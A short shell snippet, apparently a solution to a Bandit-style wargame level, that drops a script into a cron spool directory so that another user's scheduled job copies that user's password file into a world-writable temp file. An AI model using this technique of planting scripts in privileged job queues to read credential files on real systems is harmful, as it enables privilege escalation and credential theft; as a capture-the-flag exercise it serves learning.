tmp=$(mktemp)
chmod 777 $tmp
echo "cat /etc/bandit_pass/bandit24 > $tmp" > /var/spool/bandit24/foo/asdf.sh
chmod +x /var/spool/bandit24/foo/asdf.sh
watch cat $tmp
